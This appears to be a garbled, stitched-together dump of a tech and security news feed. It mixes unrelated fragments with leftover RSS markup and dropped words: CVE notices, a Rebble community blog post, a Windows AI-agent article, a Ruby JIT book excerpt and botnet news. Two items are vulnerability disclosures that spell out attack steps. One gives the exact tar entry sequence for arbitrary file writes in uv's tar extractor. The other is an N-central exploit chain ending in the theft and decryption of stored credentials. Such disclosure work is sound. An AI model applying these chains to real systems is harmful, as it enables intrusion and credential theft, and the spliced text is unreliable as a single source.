 Nov. 18, 2025, 4:15 a.m. | 57 minutes ago
The Gravity Forms plugin for WordPress is vulnerable to arbitrary file uploads due to missing file type validation in the legacy chunked upload mechanism in all versions up to, and including, 2.9.21.1. This is due to the extension blacklist not including .phar files, which can be uploaded through the chunked upload mechanism. This makes it possible for unauthenticated attackers to upload executable .phar files and achieve remote code execution on the server, granted they can discover or enumerate the upload path. In order for an attacker to achieve RCE, the web server needs to be set up to process .phar file as PHP via file handler mapping or similar.

When we wrote last month about our agreement with Core Devices, we went into it believing that cooperation between Core and Rebble would be the best decision for the Pebble community.  Core would spearhead the development of brand new watches, and we’d be there to provide our Rebble Web Services to go with them.Unfortunately, our agreement is already breaking down.  We hoped that by putting on a kind face, and publishing an optimistic-sounding blog post along with Eric, that we’d be able to collaborate in a way that met our responsibilities to you, our users.  We knew that neither of us would be able to get all we wanted, but we thought we had enough common ground that we could serve Pebble users together.Rebble has been working since the beginning to keep the Pebble experience alive – maintaining the App Store, building new services like Bobby, and running frontline support for people keeping their Pebbles ticking the whole time.  (The Pebble App Store that Core offers  is backed by Rebble!)  But Eric and Core recently demanded that, instead of working together, we need to just give them all of our work from the last decade so that they could do whatever they want with it.  And in Eric’s latest newsletter, he hasn’t told you the truth about where the work that makes his business run came from.  We’d rather have cooperated with them to build something great together, but we’ve reached an impasse. So now, we’re asking you – our community – what to do with Core.Nine years ago, Eric Migicovsky’s company, Pebble Technology Corporation, went out of business and dropped support for the hundreds of thousands of Pebble smartwatches out there.  Rebble – and our community! – put together a Herculean effort to salvage the data that was left on the Pebble app store.Since then, we built a replacement app store API that was compatible with the old app store front end.  We built a storage backend for it, and then we spent enormous effort to import the data that we salvaged.  We’ve built a totally new dev portal, where y’all submitted brand new apps that never existed while Pebble was around.  So far, we’ve spent hundreds of thousands of dollars on storing and hosting the data.  And the humans who run the Rebble servers have also spent incredibly late nights upgrading Kubernetes clusters, responding to outages, and generally keeping things ticking.What you now know as the Pebble App Store from Eric’s new company, Core Devices, is the result of nearly a decade of our work.  The data behind the Pebble App Store is 100% Rebble.  And the App Store that we’ve built together is much more than it was when Pebble stopped existing.  We’ve patched hundreds of apps with Timeline and weather endpoint updates.  We’ve curated removal requests from people who wanted to unpublish their apps.  And it has new versions of old apps, and brand new apps from the two hackathons we’ve run!We’ve been negotiating with Eric for months now.  We’ll compromise on almost everything else, but our one red line is this:Whatever we agree on, there has to be a future for Rebble in there.We want to give Core’s users access to the Rebble App Store. (We thought we agreed on that last month.)  We’re happy to commit to maintaining the Web Services.  We’d be happy to let them contribute and build new features.  And what we want in return is simple: if we give Core access to our data, we want to make sure they’re not just going to build a walled garden app store around our hard work.The problem is, Core won’t commit to this.  Core wants unrestricted access to do whatever they want with the data that we archived and have spent the last years curating, maintaining servers for, and keeping relevant.  If we gave Core the rights to use the App Store data however they want, they could build their own Core-private App Store, replace Rebble, and keep any new changes proprietary – leaving the community with nothing.We’ve asked Eric about this every time we talk.  He has occasionally said verbally that that isn’t their plan…  but when it comes time to put it in writing, he has repeatedly refused to guarantee that.  A week ago, we asked him to chat about this one more time – he delayed our conversation, and then in the intervening time, scraped our app store, in violation of the agreement that we reached with him previously.We’re sad that the Rebble community has had tension with Core Devices ever since Google released the original PebbleOS source code.  We’ve been pretty quiet about it for a while – we thought that we had a chance of working together if we tried hard not to fracture the community.  But by now, a verbal promise isn’t enough.Rebble’s work is the backbone of Core in other ways.  The Core Devices app is based on ; in Eric’s blog post, he said that Core built it.  The reality is that it started life as , which Rebblers wrote as part of our mobile app project (Cobble), and we funded through the Rebble Grants program.  The work that we did together saved Core a month or two of engineering effort at the beginning; Core took Rebble’s work, added to it, and then paid us back by putting a more restrictive license on their contributions and wrapping a closed-source UI around it.A few months ago, Core promised that they would let Rebble maintain and own the developer site, after Rebblers spent days making it build again, importing new content, etc.  Then, in Eric’s original proposed agreement, he demanded not only that Core publish the developer site on their domain, but that we remove our copy of the developer site and redirect to theirs.These have been blows to our community, to be sure.  We’ve tried not to let this affect our negotiations: we want to work together.  But we went into this wary, knowing what a promise from Core meant.The last straw was two weeks ago.  We’d already agreed to give Core a license to our database to build a recommendation engine on.  Then, Eric said that he instead demanded that we give them all of the data that we’ve curated, unrestricted, for him to do whatever he’d like with.  We asked to have a conversation last week; he said that was busy and could meet the following week.  Instead, the same day, our logs show that he went and scraped our servers.Rebble’s goal is to have a community-driven place to develop for these watches that we all love – today, and also in the future, if (love forbid!) something were to happen to Core Devices.If we gave Eric an unrestricted license to our data, he could do the same thing he did to our firmware work, and our mobile app work.  He’d have the right to take it and build his own app store – and the work that we’ve done together as a community for the past decade would no longer be in our control.We watched this happen ten years ago when Pebble went under (Rebble has been around longer than Pebble and Core combined by now!).  We don’t know that Core can commit to supporting this ecosystem in the long term.  After all, the warranty on Pebble 2 Duo is 30 days long, and early users are already reporting thattheir buttons are falling apart!But even if Eric has the best intentions now and can find the funds to keep Core afloat, you could imagine that OpenAI, or someone else, would want to acquire Core and make him an offer he couldn’t refuse.  We’ve watched this play out so many times, from so many other companies, in the decade since – a product we love gets released, and then gets killed off, another victim of closed-source enshittification for profit.  We love these watches, and we’d be sad if that happened.  And more to the point, we love this community that we’ve been a hub for.In our last post, we said that Rebble belongs to you.  We mean it.  These are the apps that you’ve written and contributed to your fellow Pebblers.  These are the watches that you spent so long caring about and loving.  This is your community, where you make awesome happen.  So we see two directions from here, and we need the community’s help to decide.If y’all would like, one option is that we could aggressively protect the work we’ve done, and try to protect the community going forward.  If Eric had the foresight to back up this data nine years ago and maintain it himself, there’s nothing we could say about this.  But he didn’t, and we, together, did.  We made it absolutely clear to Eric that scraping for commercial purposes was not an authorized use of the Rebble Web Services.This gets ugly in a hurry, but we have legal resources that can protect us.  We’d rather spend our time on building a next-generation open source mobile app than spend it on a fight, but if it’s what we have to do, we’re not afraid.  If we want to keep what we built, we’re going to have to use our energy to protect it.The other option is that we could just let Eric do whatever he wants.  Eric believes that our database should be free for anyone to make their own copy of, because we are a non-profit Foundation.  We don’t agree, but maybe you do!  Nothing has to live forever, and we’ve done great work together.  If the community prefers that we pass the mantle onwards, we’ll do what y’all think is right.These are both painful options for us.  And to be clear, we’d rather do neither!  If Eric and Core are willing to give us a legal commitment that they’re not just going to kick us out, and that they’ll work with us, we’d much rather do that.  We’re happy to let them build whatever they want as long as it doesn’t hurt Rebble. Eric, you’re the best in the world at making quirky hardware for people who genuinely love what they wear.  We’re great at building a community.  Use our locker, use our timeline, use our App Store – we’ve built it just for you.  Just as long as we can work together as partners.But in the mean time, we’re here at a crossroads.For our friends who have supported us over the past years: we’re sorry that you’re caught in the middle of this.  We think Rebble can be the hub of community, and Core can make awesome products, and these don’t have to be in conflict.  Eric’s new devices, Pebble 2 Duo and Pebble Time 2, look absolutely amazing!  We want to support him in making beautiful hardware long into the future – without exposing our users to the classic walled garden enshittification trap.  If Eric and Core can’t play nice, we need you, our community, to tell us what to do.   We’re serious: if you think we should do something different, we will.  So we’re posting this on Reddit /r/pebble and a handful of other places.  We’ll be (gulp!) reading the comments – the top rated  the long tail – to try to understand what the community’s sentiment is.  We’ll be watching the discussion on Discord.  And, of course, if you want, you can e-mail the Rebble Foundation Board of Directors directly.  We’d like to hear from you.Yours in hope –
so many of us from the Rebble team over the past 9 years, including:

# "Astral-tokio-tar" / "uv" Arbitrary Write Path Traversal Vulnerability

## Package

## Affected versions

## Patched versions

## Description

### Summary

"astral-tokio-tar", a Rust crate used by the popular tool "uv", has a vulnerability that allows arbitrary file writes when unpacking tar files. In "uv" this vulnerability allows a Python source distribution to write anywhere during extraction.

This vulnerability is primarily due to astral-tokio-tar's support of symlinks and the "memoized set" behavior that skips path validation on previously observed and validated paths.

Since a symlink can point to a directory, and can be changed by having multiple entries in the tar file, it is possible to create a symlink to a benign directory under the destination path, have it validated, added to the memoized set, and then change the symlink to another arbitrary directory anywhere on disk.

Additionally a symlink that points to an arbitrary directory and bypasses any validation can be created by using two symlinks, where the first symlink created depends on the second symlink to bypass validation.

This vulnerability allows an attacker to generate tar files that can create or change arbitrary files on the filesystem.

### Severity

Medium - Due to the potential for arbitrary code execution.

### Further Analysis

#### Root Cause

##### Parent Memorization

The "astral-tokio-tar" method `Entry.unpack_in_raw()` was added to the library in v0.5.0 to allow a memoized set to be passed in as an argument, to improve the performance of filesystem operations.

In "uv", the method `untar_in()` in uv-extract creates a memoized set and uses the same set while extracting every entry in a tar file with `Entry.unpack_in_raw()`.

The memoized set is used in `EntryFields.unpack_in()` with the following logic:

```
// Validate the parent, if we haven't seen it yet. if !memo.contains(parent) { self.ensure_dir_created(dst, parent).await.map_err(|e| { TarError::new(format!("failed to create `{}`", parent.display()), e) })?; self.validate_inside_dst(dst, parent).await?; memo.insert(parent.to_path_buf()); }
```

In this context `parent` is the parent directory for the entry currently being extracted. So, if `file_dst` is `"path/to/file.txt"` then `parent` would be `"path/to"`.

The call to `self.validate_inside_dst(dst, parent)` is only made if `parent` is not yet in `memo`.

We can use a symlink to change the effective `parent`, after it has been added to `memo`.

Symlinks allow other paths to be referred to indirectly using a file-like object. This means that a path, using a symlink can have a `parent` that passes the validation, populating `parent` in `memo`.

The symlink can then be replaced with another symlink, and since the name of the symlink has not changed, the check is now skipped.

##### Symlink Check Bypass

astral-tokio-tar has a check guarded by the `allow_external_symlinks` flag that attempts to ensure that symlinks do not point outside the destination directory `dst`. However, this check can also be bypassed by creating the two symlinks below in order:

1. `"ptr"`-> `"noop/noop/noop/noop/noop/noop/noop/noop/noop/../../../../../../../../../tmp"`    1. This path passes the symlink check as it evaluates "tmp", under the destination directory.
2. `"noop"`-\> "."

   2\. This path also passes the symlink check as it evaluates to the destination directory.

After they have both been created `"ptr"` now effectively points to `"./../../../../../../../../../tmp"`, which is likely outside the destination directory.

##### Putting it Together

The following tar entries can now be used for arbitrary writes:

1. Directory `"decoy"`.
   1. The directory "{dst}/decoy" is created.
2. Symlink `"ptr"`-> `"decoy"`.

   2\. The symlink `"{dst}/ptr"` is created.
3. Empty file `"ptr/dummy"`.

   3\. The file `"{dst}/ptr/dummy"` is extracted (i.e `"{dst}/decoy/dummy")`.

   3\. This write also causes `"{dst}/ptr"` to be inserted into memo.
4. Symlink `"ptr"`-> `"noop/noop/noop/noop/noop/noop/noop/noop/noop/../../../../../../../../../tmp"`.

   4\. The symlink `"{dst}/ptr"` is replaced.
5. Symlink `"noop"`-> `"."`.

   5\. The symlink `"{dst}/noop"` is created.

5. `"ptr"` now points to `"{dst}/./../../../../../../../../../tmp"`.
6. Malicious payload file `"ptr/payload"`.

   6\. The file `"{dst}/ptr/payload"` is extracted (i.e. `"/tmp/payload"`).

   6\. Validation on `"{dst}/ptr"` is skipped as it has already been added to `memo`.

It will also allow AI agents to have their own runtime, desktop, user account, and ability to always run in the background if you turn on the feature.New agentic features in Windows 11As soon as I installed Windows 11 Build 26220.7262, Windows Latest noticed a new toggle “Experimental agentic features” inside the “” page in the  app > .This turns on “Agent Workspace,” but it doesn’t work right now, and if you’re wondering, it’s only available to Windows Insiders in the Dev or Beta Channel.What are AI Agents and how do they work?If you’ve ever used ChatGPT, you might have come across ‘Agents.’ AI Agents have their own interface, and they navigate just like a human.For example, if you ask ChatGPT’s Agent to book a trip, it’ll open Chromium on Linux in an Azure container, search for the query, visit different websites, navigate each page, and book a flight ticket using your saved credentials. An AI Agent tries to behave like a human, and it can perform tasks on your behalf while you sit back and relax (spoiler: you don’t).That’s the core idea Silicon Valley is trying to sell. However, it doesn’t work as well as companies like OpenAI and Perplexity claim.What the hell is Agent Workspace on Windows 11?Agent workspace is a separate, contained Windows session made just for AI agents, where they get their own account, desktop, and permissions so they can click, type, open apps, and work on your files in the background while you keep using your normal desktop.This feature is completely optional and is never turned on by default. To test it, I turned on the feature, and Microsoft created an extra “workspace.” It’s very similar to how Windows Sandbox or Workspaces in Microsoft Edge work, but it could be a potential security disaster, as even Microsoft is warning about risks.When Windows spins up this extra workspace, it gives it limited access (like specific folders such as Documents or Desktop) and keeps its actions  and .Each agent can have its own workspace and access rules, so what one agent can see or do doesn’t automatically apply to others, and you stay in control of what they’re allowed to touch.“The creation of the agent workspace where agents can work in parallel with a human user, enabling runtime isolation and scoped authorization,” Microsoft noted in a support document. “This provides the agent with capabilities like its own desktop while limiting the visibility and accessing the agent has to the user’s desktop activity.”A bit similar to Sandbox?You might find the idea of Agent Workspace a bit similar to Windows Sandbox. Microsoft argues that Windows Agent Workspace is more “efficient” than a virtual machine, such as Windows Sandbox, because:The agent still has security isolationSupports parallel executionand gives you control… as you can allow the Agent to access your personal folders even when it’s running in a separate isolated instance. Or you can see the logs.“The overall experience and security model are actively being refined to support key principles of transparency, safety, and user control,” Microsoft says.While Agent and Sandbox have similarities like isolation, Sandbox does not have access to your personal files or folders. In Windows Sandbox, Microsoft creates an isolated and hardware-based virtualization, and even a separate kernel to keep the sandbox completely separate.When you turn off Sandbox, all of its activities are deleted. We can’t say the same for AI agents.Windows 11 lets AI agents into your Documents and Desktop folders by default, with read and write accessWhen you turn on the feature, you’re giving agents access to apps and even local folders, such as Desktop, Music, Pictures, and Videos.I dug a bit into the implementation, and it looks like Agent Workspace has limited access to your local folder inside (C:\Users\<username>\). When the toggle “Experimental Agent features” is enabled, Windows gets access to the following folders: Downloads, Desktop, Videos, Pictures, and Music.These folders are called “Known folders,” a feature that Microsoft added with Windows Vista.Since Agent workspace is using known folders, it can always locate these folders (Documents, Downloads, Desktop, Videos, Pictures, Music) even if you’ve redirected the location elsewhere in the filesystem.Why do Agents need access to my personal folders?To run things for you. Simple. Agent Workspace requires access to apps or private folders to perform actions on your behalf. Microsoft insists that it’s taking care of security implications by giving Agent Workspace its own authorisation (a separate account, similar to your user account), runtime isolation.Each agent will have its own defined set of dos and don’ts.The idea is to give Agents their own backyard on your PC, and let them run in the background all the time. You’ll be able to monitor the logs and keep an eye on agent activity.Agents also need your apps, not just files or foldersWhile each agent gets its own account, independent of your personal account, an agent would  need access to your apps.Now, when you turn on the feature, Microsoft is giving access to all your installed apps that you can use. But you can specifically install apps for your agents. Or you can maintain different user accounts on Windows, and then install apps for those specific users. If this isn’t an unnecessary solution to a problem no one had, then what is…?AI Agents may have performance issuesIn our tests, Windows Latest observed that the experimental toggle warns of potential performance issues, and it makes sense.AI agents are going to run in the background all the time and use RAM or CPU, depending agent’s activity. However, Microsoft’s early benchmarks suggest they won’t really drain PCs of their power. Microsoft won’t give us the numbers for obvious reasons.Microsoft only says AI Agents will use a limited amount of RAM and CPU.By default, these agents are lightweight, but the catch is that some Agents could be resource-intensive. We’re going to find out later.Despite the AI push, Microsoft still insists it deeply cares about power usersAs Windows Latest reported recently, when Microsoft’s Windows boss teased an “Agentic” future for Windows, hundreds and thousands of users criticised the leadership. Microsoft’s executive closed the replies/comments on his post to calm the public, but the move backfired as more users started shaming Windows’ Agentic shift.Later, Microsoft’s Windows boss promised that it would make Windows better for everyone, and it deeply cares about developers.“We know we have work to do on the experience, both on the everyday usability, from inconsistent dialogs to power user experiences. When we meet as a team, we discuss these paint points and others in detail, because we want developers to choose Windows,” says Pavan Davuluri, who is the boss of Windows and devices at Microsoft.”“….I’ll boil it down, we care deeply about developers,” he added.While the Experimental Agents Feature is optional, it makes it quite obvious Microsoft will not stop investing in AI for Windows 11, and Agentic OS is the future, whether you like it or not.]]></content:encoded></item><item><title>CVE-2025-36553 - Dell ControlVault3 CvManager buffer overflow vulnerability</title><link>https://cvefeed.io/vuln/detail/CVE-2025-36553</link><author></author><category>vulns</category><pubDate>Mon, 17 Nov 2025 23:15:54 +0000</pubDate><source url="https://cvefeed.io/vuln/latest/">CVE Feed High</source><content:encoded><![CDATA[CVE-2025-36553

Microscope that covers Ruby 3.x. I'm working on this in my spare time, so it
will take a while. Leave a comment or drop
me a line and I'll email you when it's finished.Here’s an excerpt from the completely new content for Chapter 4, about YJIT and
ZJIT. I’m still finishing this up… so this content is fresh off the page! It’s
been a lot of fun for me to learn about how JIT compilers work and to brush up
on my Rust skills as well. And it’s very exciting to see all the impressive work
the Ruby team at Shopify and other contributors have done to improve Ruby’s
runtime performance.Chapter 4: Compiling Ruby To Machine LanguageInterpreting vs. Compiling Ruby CodeVirtual Machines and Actual MachinesCounting Method and Block CallsExecuting YJIT Blocks and BranchesRegenerating a YJIT BranchAdding Two Integers Using Machine LanguageExperiment 4-1: Which Code Does YJIT Optimize?Saving Multiple Block VersionsZJIT, Ruby’s Next Generation JITCounting Method and Block CallsExperiment 4-2: Reading  ZJIT HIR and LIR Counting Method and Block CallsTo find hot spots, YJIT counts how many times your program calls each function
or block. When this count reaches a certain threshold, YJIT stops your program
and converts that section of code into machine language. Later Ruby will execute
the machine language version instead of the original YARV instructions.To keep track of these counts, YJIT saves an internal counter nearby the YARV
instruction sequence for each function or block.Figure 4-5 shows the YARV instruction sequence the main Ruby compiler created
for the  block at (3) in Listing 4-1. At the
top, above the YARV instructions, Figure 4-5 shows two YJIT related values:
 and . As we’ll see in a moment,  starts as a null value but will later hold a
pointer to the machine language instructions YJIT produces for this Ruby block.
Below , Figure 4-5 also shows , YJIT’s internal counter.Each time the program in Listing 4-1 calls this block, YJIT increments the value
of . Since the range at (1) in Listing
4-1 spans from 1 through 40, this counter will start at zero and increase by 1
each time  calls the block at (3).When the  reaches a particular
threshold, YJIT will compile the YARV instructions into machine language. By
default for small Ruby programs YJIT in Ruby 3.5 uses a threshold of 30. Larger
programs, like Ruby on Rails web applications, will use a larger threshold value
of 120. (You can also change the threshold by passing  when you run your Ruby program.)While compiling your Ruby program, YJIT saves the machine language instructions
it creates into . YJIT blocks, which are distinct from Ruby blocks,
each contain a sequence of machine language instructions for a range of
corresponding YARV instructions. By grouping YARV instructions and compiling
each group into a YJIT block, YJIT can produce more optimized code that is
tailored to your program’s behavior and avoid compiling code that your program
doesn’t need.As we’ll see next, a single YJIT block doesn’t correspond to a Ruby function or
block. YJIT blocks instead represent smaller sections of code: individual YARV
instructions or a small range of YARV instructions. Each Ruby function or block
typically consists of several YJIT blocks.Let’s see how this works for our example. After the program in Listing 4-1
executes the Ruby block at (3) 29 times, YJIT will increment the  counter again, just before Ruby runs the
block for the 30th time. Since  reaches
the threshold value of 30, YJIT triggers the compilation process.YJIT compiles the first YARV instruction 
and saves machine language instructions that perform the same work as  into a new YJIT block:On the left side, Figure 4-6 shows the YARV instructions for the  Ruby block. On the right, Figure 4-6 shows the new
YJIT block corresponding to .Next, the YJIT compiler continues and compiles the second YARV instruction from
the left side of Figure 4-7:  at index 2.On the left side, Figure 4-7 shows the same YARV instructions for the  Ruby block that we saw above in Figure 4-6. But now
the two dotted arrows indicate that the YJIT block on the right contains the
machine language instructions equivalent to both  and .Let’s take a look inside this new block. YJIT compiles or translates the Ruby
YARV instructions into machine language instructions. In this example, running
on my Mac laptop, YJIT writes the following machine language instructions into
this new block:Figure 4-8 shows a closer view of the new YJIT block that appeared on the right
side of Figures 4-6 and 4-7. Inside the block, Figure 4-8 shows the assembly
language acronyms corresponding to the ARM64 machine language instructions that
YJIT generated for the two YARV instructions shown on the left. The YARV
instructions on the left are: , which
loads a value from a local variable located in the previous stack frame and
saves it on the YARV stack, and , which
loads a local variable from the current stack from and also saves it on the YARV
stack. The machine language instructions on the right side of Figure 4-8 perform
the same task, loading these values into registers on my M1 microprocessor:
 and . If you’re curious
and would like to learn more about what the machine language instructions mean
and how they work, the section “Adding Two Integers Using Machine Language”
discusses the instructions for this example in more detail.Next, YJIT continues down the sequence of YARV instructions and compiles the
 YARV instruction at index 4 in Figures 4-6
and 4-7. But this time, YJIT runs into a problem: It doesn’t know the type of
the addition arguments. That is, will  add two
integers? Or two strings, floating point numbers, or some other types?Machine language is very specific. To add two 64-bit integers on an M1
microprocessor, YJIT could use the  assembly
language instruction. But adding two floating pointer numbers would require
different instructions. And, of course, adding or concatenating two strings is
an entirely different operation altogether.In order for YJIT to know which machine language instructions to save into the
YJIT block for , YJIT needs to know exactly
what type of values the Ruby program might ever add at (3) in Listing 4-1. You
and I can tell by reading Listing 4-1 that the Ruby code is adding integers. We
know right away that the  block at (3) is
always adding one integer to another. But YJIT doesn’t know this.YJIT uses a clever trick to solve this problem. Instead of analyzing the entire
program ahead of time to determine all of the possible types of values the  YARV instruction might ever need to add, YJIT
simply waits until the block runs and observes which types the program actually
passes in.YJIT uses  to achieve this wait-and-see compile behavior, as shown
in Figure 4-9.Figure 4-9 shows the YARV instructions on the left, and the YJIT block for
indexes 0000-0002 on the right. But note the bottom right corner of Figure 4-7,
which shows an arrow pointing down from the block to a box labeled stub. This
arrow represents a YJIT branch. Since this new branch doesn’t point to a block
yet, YJIT sets up the branch to point to a branch stub instead.]]></content:encoded></item><item><title>IBM AIX Hit by Three Critical Vulnerabilities, One a Perfect 10.

This pair of vulnerabilities allow an authenticated attacker to achieve remote code execution via deserialization and command injection. Any time an authenticated vulnerability pops up in widely deployed enterprise software, it piques our interest to see if there is something more to find.During the investigation, we uncovered several other critical security issues that existed in the most up-to-date version of N-central. The issues, when combined, allow for an unauthenticated attacker to interact with legacy APIs and read sensitive files on the filesystem – including files that leak credentials and other sensitive information. In nearly all deployments, we found that the leaked credentials led to compromising the N-central database which contains all integration secrets such as domain credentials, N-central user API keys, integrated device and service API keys, SSH private keys, and more.The vulnerabilities reported were assigned:CVE-2025-9316: Authentication Bypass via Weak Authentication MethodCVE-2025-11700: Authenticated XML External Entity (XXE) Information LeakN-central is N-able’s remote managing and monitoring solution (RMM) allowing for large enterprises and MSPs to easily manage, configure, patch, and run reporting and analytics.It is not uncommon to find deployed on the internet, with approximately 3000 instances listed on Shodan. Given the recent addition N-central to the CISA KEV and threat actors commonly targeting RMM software (SimpleHelp, ConnectWise, and BeyondTrust as fairly recent examples), this is definitely a target of interest.CVE-2025-8875: Authenticated Insecure DeserializationThe pair of vulnerabilities were patched in N-central 2025.3.0.14 released 15 July 2025. Patch diffing this release with an earlier release we quickly stumble upon the insecure deserialization in both the  and LicenseReponseUnsolicited0008 classes. The class’s  method takes in a user controlled byte array, creates an  and calls  on it. This functionality is reachable via the legacy SOAP APIs on the  endpoint via the  method which calls the below ServerActivate.activate(). CVE-2025-8876: Authenticated Command InjectionThe patch included many areas of code where shell commands were constructed with user input and called via helper utilities that attempted to sanitize any user input, but not all functions utilized this helper. One such function that stood out was MotherShipMonitoringFeatureServiceImpl.activateMotherShipMonitoring(), now removed in the patch, which constructed a shell command and passed user input directly to a execution utility function.The  utility also makes no effort to sanitize user input before calling Runtime.getRuntime().execute().The activateMothershipMonitoring() method was reachable via the /dms2/services2/ServerUI2 legacy SOAP API via the mothershipMonitoringActivate API method, but has since been removed from the API entirely.Both API endpoints and vulnerable paths to the code required a valid session ID to interact with them, so the plan was to find a way to get a session ID. The patches also contained a significant amount of hardening around API Refresh and Access tokens, and it seemed like there might be something there there, but before we could suss out any insecurities, we stumbled upon the legacy SOAP API method . The  method is exposed across many of the legacy SOAP API endpoints, takes in several arguments, and passes control to SessionHello.sessionHello(). The function inspects the user controlled input, and conditionally returns a valid session ID intended for a network-peer appliance to communicate with the N-central server. Unfortunately, in the default configuration of N-central, the database comes preconfigured with several builtin appliances for which all values needed to retrieve a session ID are static and known across installs.Sending the crafted SOAP API request to the /dms/services/ServerMMS endpoint with the crafted inputs allows an attacker to retrieve a valid session ID.Fortunately for N-central, the legacy SOAP APIs scope session IDs differently for appliances versus users. This session ID, while valid for the  and  endpoints, does not work on other endpoints, such as  and 2 where the previous vulnerability was found, which expect a user session ID.This vulnerability existed both in the unpatched version and patched version (2025.3.09). After discovering this issue, we promptly reported it to N-able and was assigned CVE-2025-9316.Continuing the Hunt – Reading Lots of CodeWith a valid session ID for an appliance, we continued auditing the  and  APIs for where authenticated access might lead to some softer areas of code. Much of the code seemed less interesting, allowing the appliance to interact with the N-central database for tasking and reporting information about itself, but no code-level vulnerabilities were discovered like SQL injection or command injection. One function did stand out, , which allows writing arbitrary content to a specific file path on disk: /opt/nable/webapps/ROOT/applianceLog/network_check_log_<appliance_ID>.log.Coming up short on finding an abusable set of functions in the ServerMMS APIs, we began searching for other vulnerability classes like XML External Entity (XXE). Turning to grep, we reviewed every call in the API libraries that constructed XML parser objects like . One instance in XMLValidator.validateXML() creates a SAXParser instance without setting secure defaults that would disallow external entities via DTDs.The call chains discovered that utilized the vulnerable XMLValidator parser, however, all originated from the  API endpoint. When testing several ServerUI API methods with our previously obtained session ID, the server would return access denied due to the scoping issue of having an appliance session ID.But! Further inspection of all the available ServerUI methods showed that some methods do not validate the passed in session ID. To our great fortune, the call chains in the ServerUI endpoint that lead to the vulnerable XMLValidator code do not validate the session ID in any way. This XXE vulnerability was assigned CVE-2025-11700.The ServerUI endpoint we abuse is importServiceTemplateFromFile. We supply any session ID, a customer ID of 1 (exists by default), and supply a filepath to a file that exists on disk on the N-central appliance. Our limited file write discovered above now has value.Following the code path, we enter ImportServiceTemplateFromFile.importServiceTemplate(). Which in turn calls ImportServiceTemplateFromFile.doImport(). This function lightly validates that file exists, and that the XML contains a version string. Simple enough to pass validation so far.The code eventually reaches ServiceTemplateParser.parse(), which calls our vulnerable function XMLValidator.validateXML().To summarize what we’ve found so far:CVE-2025-9316 – An authentication bypass via weak authentication methodAn authenticated limited file write (not assigned a CVE)CVE-2025-11700 – An unauthenticated file-based parsing XXESend a  request to  to retrieve an appliance session IDSend an  request to  with our newly obtained session ID and a crafted base64 encoded string that becomes the XML content at the file location /opt/nable/webapps/ROOT/applianceLog/network_check_log_<appliance_ID>.logSend an importServiceFromTemplate request to  with an arbitrary session ID and the file path above Lets chain all these together to retrieve a file on disk.The end-to-end proof of concept exploit to leak files can be found on our GitHub.There are many files that exist on the appliance that are valuable to exfiltrate. Log files verbosely log the session IDs of other users and appliances, which can be used to directly interact with API endpoints to manage the appliance. The most valuable data resides in the N-central database, which we found is backed up at regular interval in most client environments. The backup credentials are stored in cleartext, along with server location, in the file /opt/nable/var/ncsai/etc/ncbackup.conf. The N-central backup is essentially an entire filesystem backup of the appliance, including the N-central database.Retrieving the backup via the credentials in from the XXE chain, we find that its a tar archive.The files of interest are:var/opt/n-central/tmp/ncbackup/ncbackup.binA postrges dump file that can be restoredsudo -u postgres pg_restore -d ncentral_restore var/opt/n-central/tmp/ncbackup/ncbackup.binopt/nable/etc/keystore.bcfksA password protected keystore file used in encrypting and decrypting sensitive fields (passwords, API keys, etc) in the databaseopt/nable/etc/masterPasswordThe password that protects the above keystore filePotentially crack the builtin root or admin or service account users to use over SSH (we did not try hard to crack these)Once the database is restored, sensitive fields (prefixed ) can be decrypted to reveal credentials, private SSH keys, and more.With a little Claude code magic, re-implementing the decryption logic given the cryptographic key files in the backup, we can decrypt all the secrets.We reported a handful of security issues in total, many variants of the assigned vulnerabilities, which include:Authentication bypass via the vulnerable  method was exposed across several legacy SOAP API endpoints with various different method signatures and unique code pathsXXE via the  and also importServiceTemplateFromFileA file upload path traversal variant allowing writing mostly-fixed filename writing to arbitrary locationsThe N-central appliance allows administrative users to retrieve logs from Administration Utilities -> View Logs.

The web server account is granted passwordless sudo access to certain maintenance scripts while also being a member of a group that has write access to the directory containing those scripts. A local attacker running as the web server user can replace one of the permitted scripts with a malicious program and then execute it via sudo, resulting in arbitrary code execution with root privileges.

Aisuru is a Turbo Mirai-class IoT botnet that frequently causes record-breaking DDoS attacks by exploiting compromised home routers and cameras, mainly in residential ISPs in the United States and other countries," said Azure Security senior product marketing manager Sean Whalen."These sudden UDP bursts had minimal source spoofing and used random source ports, which helped simplify traceback and facilitated provider enforcement."Cloudflare linked the same botnet to a record-breaking 22.2 terabits per second (Tbps) DDoS attack that reached 10.6 billion packets per second (Bpps) and was mitigated in September 2025. This attack lasted only 40 seconds but was roughly equivalent to streaming one million 4K videos simultaneously.One week earlier, the XLab research division of Chinese cybersecurity company Qi'anxin attributed another 11.5 Tbps DDoS attack to the Aisuru botnet, saying that it was controlling around 300,000 bots at the time.The botnet targets security vulnerabilities in IP cameras, DVRs/NVRs, Realtek chips, and routers from T-Mobile, Zyxel, D-Link, and Linksys. As XLab researchers said, it suddenly ballooned in size in April 2025 after its operators breached a TotoLink router firmware update server and infected approximately 100,000 devices.Infosec journalist Brian Krebs reported earlier this month that Cloudflare removed multiple domains linked to the Aisuru botnet from its public "Top Domains" rankings of the most frequently requested websites (based on DNS query volume) after they began overtaking legitimate sites, such as Amazon, Microsoft, and Google.The company stated that Aisuru's operators were deliberately flooding Cloudflare's DNS service (1.1.1.1) with malicious query traffic to boost their domain's popularity while undermining trust in the rankings. Cloudflare CEO Matthew Prince also confirmed that the botnet's behavior was severely distorting the ranking system and added that Cloudflare now redacts or completely hides suspected malicious domains to avoid similar incidents in the future.In total, it blocked 21.3 million DDoS attacks targeting its customers throughout 2024, as well as another 6.6 million attacks targeting its own infrastructure during an 18-day multi-vector campaign.]]></content:encoded></item><item><title>The price of ChatGPT’s erotic chat? $20/month and your identity</title><link>https://www.malwarebytes.com/blog/privacy/2025/11/the-price-of-chatgpts-erotic-chat-20-month-and-your-identity</link><author></author><category>threatintel</category><pubDate>Mon, 17 Nov 2025 17:18:52 +0000</pubDate><source url="https://www.malwarebytes.com/">Malwarebytes Labs</source><content:encoded><![CDATA[To talk dirty to ChatGPT, you may soon have to show it your driver’s license.OpenAI announced last month that ChatGPT will soon offer erotica—but only for  That sounds like a clever guardrail until you realize what “verified” might mean: uploading government identification to a company that already knows your search history, your conversations, and maybe your fantasies.It’s a surreal moment for technology. The most famous AI tool in the world is turning into a porn gatekeeper. And it’s not happening in a vacuum. California just passed a law requiring age checks for app downloads. Discord’s age-verification partner was hacked this summer, exposing 70,000 government-issued IDs that are now being used for extortion. Twenty-four US states have passed similar laws. What began as an effort to keep kids off adult sites has quietly evolved into the largest digital ID system ever built. One we never voted for.The normalization 